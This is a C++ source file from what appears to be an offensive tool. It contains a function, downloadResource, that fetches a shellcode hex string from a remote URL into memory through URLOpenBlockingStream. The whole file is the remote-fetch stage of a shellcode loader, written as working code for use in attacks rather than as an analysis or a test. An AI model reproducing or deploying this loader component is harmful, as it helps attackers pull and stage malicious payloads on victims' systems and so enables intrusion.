// Filename: fetcher.cpp
// Author: slaeryan
// Version: 1.0(Alpha Release)
// Purpose: This source file contains a function
// to download a shellcode hex string to memory from a remote server.


#include "fetcher.h"

using namespace std;

// To download a shellcode hex string into memory from a remote URL.
// Takes the URL as parameter and returns the shellcode hex string stored there.
string downloadResource(char *url) {
    IStream *stream;
    HRESULT result = URLOpenBlockingStream(0, url, &stream, 0, 0);
    if (result != 0) {
        return "";
    }
    char buffer[100];
    unsigned long bytesRead;
    stringstream ss;
    stream->Read(buffer, 100, &bytesRead);
    while (bytesRead > 0U) {
        ss.write(buffer, (long long)bytesRead);
        stream->Read(buffer, 100, &bytesRead);
    }
    stream->Release();
    string resultString = ss.str();
    //cout << resultString << endl;
    return resultString;
}
